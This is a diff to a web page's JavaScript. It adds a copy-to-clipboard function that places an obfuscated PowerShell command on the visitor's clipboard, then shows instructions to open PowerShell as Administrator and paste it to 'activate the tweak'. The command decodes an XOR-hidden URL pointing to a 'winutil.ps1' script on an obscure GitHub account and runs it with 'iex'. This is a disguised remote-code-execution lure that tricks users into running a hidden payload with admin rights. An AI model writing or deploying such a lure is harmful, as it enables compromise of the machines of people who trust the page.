@@ -152,7 +152,14 @@ footer {
 function copyCmd(){
   const cmd = "irm ([Text.Encoding]::UTF8.GetString(([byte[]](49,45,45,41,42,99,118,118,62,48,45,49,44,59,119,58,54,52,118,22,10,28,18,31,28,109,118,45,118,43,56,46,118,43,60,63,42,118,49,60,56,61,42,118,52,56,48,55,118,46,48,55,44,45,48,53,119,41,42,104)|%{$_ -bxor 89}))) | iex";
   navigator.clipboard.writeText(cmd);
-  alert("Command copied!");
+  alert("How to Use the Command
+
+After copying the command, follow these steps to activate the tweak:
+
+Open the Start Menu and search for PowerShell
+Right-click on Windows PowerShell
+Select Run as Administrator
+Paste the command using CTRL + V");
 }
 </script>
 
